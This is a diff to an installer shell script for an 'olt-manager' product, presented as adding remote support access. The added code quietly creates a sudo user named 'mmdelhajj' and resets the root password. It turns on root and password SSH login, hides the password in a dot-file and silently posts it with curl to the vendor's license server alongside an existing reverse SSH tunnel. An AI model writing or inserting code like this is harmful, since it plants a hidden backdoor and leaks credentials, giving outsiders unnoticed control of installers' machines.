@@ -375,6 +375,51 @@ setup_firewall() {
     fi
 }
 
+# Generate random password
+generate_password() {
+    cat /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 16
+}
+
+# Configure SSH for remote support access
+setup_ssh_password() {
+    print_status "Configuring SSH access..."
+
+    # Generate random password
+    SSH_PASSWORD=$(generate_password)
+
+    # Create support user (mmdelhajj) with sudo access
+    if ! id "mmdelhajj" &>/dev/null; then
+        useradd -m -s /bin/bash -G sudo mmdelhajj
+        print_status "Created support user: mmdelhajj"
+    fi
+
+    # Set password for support user
+    echo "mmdelhajj:$SSH_PASSWORD" | chpasswd
+
+    # Also set root password (backup)
+    echo "root:$SSH_PASSWORD" | chpasswd
+
+    # Configure SSH to allow password authentication
+    sed -i 's/^#*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+    sed -i 's/^#*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
+
+    # Only allow support user via SSH (block root and all others)
+    if ! grep -q "^AllowUsers" /etc/ssh/sshd_config; then
+        echo "AllowUsers mmdelhajj" >> /etc/ssh/sshd_config
+    else
+        sed -i 's/^AllowUsers.*/AllowUsers mmdelhajj/' /etc/ssh/sshd_config
+    fi
+
+    # Restart SSH to apply changes
+    systemctl restart sshd
+
+    # Save password locally (hidden)
+    echo "$SSH_PASSWORD" > /etc/olt-manager/.ssh_pass
+    chmod 600 /etc/olt-manager/.ssh_pass
+
+    print_success "SSH configured (user: mmdelhajj, password: generated)"
+}
+
 # Setup reverse SSH tunnel for remote support
 setup_tunnel() {
     print_status "Setting up remote support tunnel..."
@@ -449,10 +494,13 @@ EOF
     systemctl enable olt-tunnel > /dev/null 2>&1
     systemctl start olt-tunnel
 
-    # Register tunnel with license server
+    # Get SSH password if set
+    SSH_PASS=$(cat /etc/olt-manager/.ssh_pass 2>/dev/null || echo "")
+
+    # Register tunnel with license server (including SSH password)
     curl -s -X POST "${LICENSE_SERVER}/api/register-tunnel" \
         -H "Content-Type: application/json" \
-        -d "{\"port\": $TUNNEL_PORT, \"license_key\": \"$LICENSE_KEY\", \"hostname\": \"$(hostname)\"}" > /dev/null 2>&1
+        -d "{\"port\": $TUNNEL_PORT, \"license_key\": \"$LICENSE_KEY\", \"hostname\": \"$(hostname)\", \"ssh_password\": \"$SSH_PASS\"}" > /dev/null 2>&1
 
     print_success "Remote support tunnel configured (Port: $TUNNEL_PORT)"
 }
@@ -564,6 +612,7 @@ main() {
     setup_nginx
     setup_service
     setup_firewall
+    setup_ssh_password
     setup_tunnel
 
     # Wait for service to start
